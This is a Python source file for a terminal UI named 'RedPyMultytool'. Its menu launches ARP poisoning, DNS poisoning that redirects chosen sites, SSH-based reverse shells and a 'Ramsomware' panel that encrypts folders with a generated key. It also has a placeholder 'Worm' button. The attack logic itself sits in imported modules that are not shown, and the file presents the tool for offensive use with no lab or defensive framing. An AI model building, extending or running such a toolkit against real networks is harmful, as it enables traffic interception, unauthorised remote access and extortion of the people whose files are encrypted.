from textual.app import App, ComposeResult
from textual.containers import ScrollableContainer, Container, Horizontal
from textual.widgets import Button, Footer, Header, Static, Switch, Input, TextLog
from cipher import Ramsom
from rich.console import Console
from ArpPoisoning import ArpPoison
from DnsPoisoning import DnsPoisoning
from threading import Thread
from OpenRevShells import OpenSH
import subprocess
import traceback
import time

class Title(Static):
    pass

class DarkSwitch(Horizontal):
    def compose(self) -> ComposeResult:
        yield Switch(value=self.app.dark)
        yield Static("Dark mode toggle", classes="label")

    def on_mount(self) -> None:
        self.watch(self.app, "dark", self.on_dark_change, init=False)

    def on_dark_change(self) -> None:
        self.query_one(Switch).value = self.app.dark

    def on_switch_changed(self, event: Switch.Changed) -> None:
        self.app.dark = event.value


class Sidebar(Container):
    def compose(self) -> ComposeResult:
        yield Title("RedPyMultytool Navbar")
        yield Button("DNS Poisoning",id="dns", variant="success")
        yield Button("ARP Poisonins",id="arp", variant="success")
        yield Button("Reverse Shells",id="sh", variant="success")
        yield Button("Ramsomware",id="rmw", variant="success")
        yield Button("Worm",id="wr", variant="success")
        yield DarkSwitch()
        

    def on_button_pressed(self,event:Button.Pressed) -> None:
        button_id=event.button.id
        if button_id=="dns":
            #self.app.get_a().add_class("hidden")
            #self.app.get_b().add_class("hidden")
            #self.app.get_c().remove_class("hidden")
            try:
                self.app.query_one(ARPpoison).remove()
                self.app.query_one(ReverseSH).remove()
                self.app.query_one(DNSPoison).remove()
                self.app.query_one(Ramsomware).remove()
            except:
                print("f1")
            self.app.mount(self.app.get_c())
            self.add_class("dnsp")
            self.remove_class("rams")
            self.remove_class("shell")
            self.remove_class("arpp")
            self.remove_class("wrm")
        elif button_id=="arp":
            #self.app.get_a().remove_class("hidden")
            #self.app.get_b().add_class("hidden")
            #self.app.get_c().add_class("hidden")
            try:
                self.app.query_one(DNSPoison).remove()
                self.app.query_one(ReverseSH).remove()
                self.app.query_one(ARPpoison).remove()
                self.app.query_one(Ramsomware).remove()
            except:
                print("f2")
            self.app.mount(self.app.get_a())
            self.add_class("arpp")
            self.remove_class("shell")
            self.remove_class("rams")
            self.remove_class("dnsp")
            self.remove_class("wrm")
        elif button_id=="sh":
            #self.app.get_a().add_class("hidden")
            #self.app.get_b().remove_query_one("main")class("hidden")
            #self.app.get_c().add_class("hidden")
            try:
                self.app.query_one(ARPpoison).remove()
                self.app.query_one(ReverseSH).remove()
                self.app.query_one(DNSPoison).remove()
                self.app.query_one(Ramsomware).remove()
            except:
                print("f3")
            self.app.mount(self.app.get_b())
            self.add_class("shell")
            self.remove_class("arpp")
            self.remove_class("dnsp")
            self.remove_class("rams")
            self.remove_class("wrm")
        elif button_id=="rmw":
            try:
                self.app.query_one(ARPpoison).remove()
                self.app.query_one(ReverseSH).remove()
                self.app.query_one(DNSPoison).remove()
                self.app.query_one(Ramsomware).remove()
            except:
                print("f3")
            self.app.mount(self.app.get_d())
            self.add_class("rams")
            self.remove_class("arpp")
            self.remove_class("dnsp")
            self.remove_class("shell")
            self.remove_class("wrm")
        elif button_id=="wr":
            self.add_class("wrm")
            self.remove_class("arpp")
            self.remove_class("dnsp")
            self.remove_class("shell")
            self.remove_class("rams")

class ReverseSH(Static):
    t=""
    rv=""
    inp1=Input(placeholder="0.0.0.0",id="revTIP")
    inp2=Input(placeholder="SSH port (22)",id="prt")
    inp3=Input(placeholder="User",id="usr")
    inp4=Input(placeholder="Password",id="pasw")
    inp6=Input(placeholder="Random bind port",id="lport")
    tl=TextLog(highlight=True, markup=True, id="DnsLog")
    cont=Container(
        Title("Reverse Shell",id="revTitle",expand=True),
        Static("Target IP:"),
        inp1,
        Static("ssh Port:"),
        inp2,
        Static("User:"),
        inp3,
        Static("Password:"),
        inp4,
        Static("Server Listener bind Port:"),
        inp6,
        Container(
            Button("Start",id="revStart"),
            Button("Stop",id="revStop"),
            id="RevBtn"
        ),
        tl,
        id="RevTUI"
    )

    def compose(self) -> ComposeResult:
        yield self.cont
    
    def setAndRun(self):
        self.tl.write("Inside")
        self.rv=OpenSH()
        self.rv.ssh_command(ip=self.inp1.value,p=self.inp2.value,user=self.inp3.value,passwd=self.inp4.value,srvP=self.inp6.value,t=self.tl)
        self.tl.write()

    def on_button_pressed(self,event:Button.Pressed) -> None:
        button_id=event.button.id
        if button_id=="revStart":
            self.t=Thread(target=self.setAndRun)
            self.tl.write("fatto")
            self.t.start()

            

class DNSPoison(Static):
    t=""
    t=""
    inp1=Input(placeholder="site url",id="Surl")
    inp2=Input(placeholder="redirect IP",id="Rip")
    tl=TextLog(highlight=True, markup=True, id="DnsLog")
    cont=Container(
        Title("DNS Poisoning",id="dnsTitle",expand=True),
        Static("Site url:"),
        inp1,
        Static("SIte Ip redirection:"),
        inp2,
        Container(
            Button("Add",id="btnAdd"),
            Button("Show",id="btnshw"),
            Button("Remove",id="btnDel"),
            id="DNS_addel"
        ),
        tl,
        Container(
            Button("Start",id="DnsStart"),
            Button("Stop",id="DnsStop"),
            id="DNS_st"
        ),
        id="dnsTUI"
    )
    dnsp=DnsPoisoning(tl)

    def compose(self) -> ComposeResult:
        yield self.cont

    def on_button_pressed(self,event:Button.Pressed) -> None:
        button_id=event.button.id
        if button_id=="btnAdd":
            #self.tl.clear()
            self.dnsp.addEntity(self.inp1.value,self.inp2.value)
            self.tl.write("Added on dict")
        elif button_id=="btnshw":
            d=self.dnsp.showDict()
            for e in d: self.tl.write(e.decode('utf-8')+"-"+d[e])
        elif button_id=="btnDel":
            try:
                self.dnsp.removeEntity(self.inp1.value)
            except(KeyError):
                self.tl.write("Error: "+self.inp1.value+" not in dict")
        elif button_id=="DnsStart":
            self.t=Thread(target=self.dnsp.run)
            self.t.start()
            self.tl.write("waiting for DNS packets...")
        elif button_id=="DnsStop":
            self.tl.write("Stoped")



class ARPpoison(Static):
    arpois=""
    t=""
    i1=Input(placeholder="0.0.0.0",id="tip")
    i2=Input(placeholder="0.0.0.0",id="gip")
    i3=Input(placeholder="Default en0",id="intf")
    tl1=TextLog(highlight=True, markup=True, id="arpInfoTL")
    tl2=TextLog(highlight=True, markup=True, id="arpProcTL")
    cont= Container(
            Title("ARP Poisoning",id="arpTitle",expand=True),
            Static("Target IP:"),
            i1,
            Static("Gateway IP:"),
            i2,
            Static("Interface:"),
            i3,
            Container(
                Button("Submit",id="ARPsubm"),
                Button("Reset",id="ARPreset"),
                id="ARPsub_res"
            ),
            Container(
                tl1,
                tl2,
                id="ARPlogs"
            ),
            Container(
                Button("Start",id="ARPstart"),
                Button("Stop",id="ARPstop"),
                id="ArpST_st"
            ),
            id="arpTUI"
        )
    def compose(self) -> ComposeResult:
        yield self.cont
    
    def arpfunct(self):
        self.arpois=ArpPoison(self.tl1,self.tl2,self.i1.value,self.i2.value,self.i3.value)

    def on_button_pressed(self,event:Button.Pressed) -> None:
        button_id=event.button.id
        console=Console()
        if button_id=="ARPsubm":
            self.tl1.clear()
            try:
                self.t=Thread(target=self.arpfunct)
                self.t.start()
            except(TypeError):
                self.tl1.write("Input error, missing arguments")
                self.tl1.write(traceback.format_exc())
                
        elif(button_id=="ARPreset"):
            self.tl1.clear()
            self.tl2.clear()
            self.i1.value=""
            self.i2.value=""
            self.i3.value=""
        elif(button_id=="ARPstart"):
            t1=Thread(target=self.arpois.poison)
            self.tl2.write(console.status("[bold green]Working on tasks..."))
            t1.start()
        elif(button_id=="ARPstop"):
            self.arpois.ARPstop()

class Ramsomware(Static):
    ciph=Ramsom()
    inp2=Input(placeholder="PATH",id="pat")
    inp1=Input(placeholder="key Path IP",id="kpat")
    tl=TextLog(highlight=True, markup=True, id="ramKEYLog")
    tl1=TextLog(highlight=True, markup=True, id="ramCryptLog")
    cont=Container(
        Title("Ramsomware",id="ramsTitle",expand=True),
        Static("cryptKey: "),
        inp1,
        Container(
            Button("Generate new key",id="genKEY"),
            Button("Delete key",id="delKEY"),
            Button("Use key",id="useKey"),
            id="keys"
        ),
        tl,
        Static("Folder path to encrypt/decript: "),
        inp2,
        Container(
            Button("Encrypt",id="encr"),
            Button("Decrypt",id="decr"),
            id="Rams"
        ),
        tl1,
        id="ramsomTUI"
    )

    def compose(self) -> ComposeResult:
        yield self.cont

    def on_button_pressed(self,event:Button.Pressed) -> None:
        button_id=event.button.id
        if button_id=="genKEY":
            self.ciph.Key_gen(self.inp2.value,self.tl)
            self.tl.write("Added on dict")
        elif(button_id=="delKEY"):
            self.ciph.deleteKEY(self.inp2.value,self.tl)
        elif(button_id=="useKey"):
            self.ciph.setKey(self.inp2.value,self.tl)
        elif(button_id=="encr"):
            self.ciph.crypt(self.inp1.value,self.tl1)
        elif(button_id=="decr"):
            self.ciph.decrypt(self.inp1.value,self.tl1)



class RedPyMultytool(App):
    a=ARPpoison()
    b=ReverseSH()
    c=DNSPoison()
    d=Ramsomware()
    CSS_PATH = "app.css"
    BINDINGS=[("q","quit","Exit app"),("d","toggle_dark","Toggle dark mode"),("b", "toggle_sidebar", "Sidebar"),]
    def compose(self) -> ComposeResult:
        yield Header()
        #yield self.c
        #yield self.b
        #yield self.a
        yield Sidebar(classes="-hidden")
        yield Footer()
    
    def get_a(self):
        return self.a
    
    def get_b(self):
        return self.b

    def get_c(self):
        return self.c

    def get_d(self):
        return self.d


    def action_toggle_sidebar(self) -> None:
        sidebar = self.query_one(Sidebar)
        self.set_focus(None)
        if sidebar.has_class("-hidden"):
            sidebar.remove_class("-hidden")
        else:
            if sidebar.query("*:focus"):
                self.screen.set_focus(None)
            sidebar.add_class("-hidden")


    def action_toggle_dark(self) -> None:
        return super().action_toggle_dark()
    
if __name__=="__main__":
    app= RedPyMultytool()
    app.run()  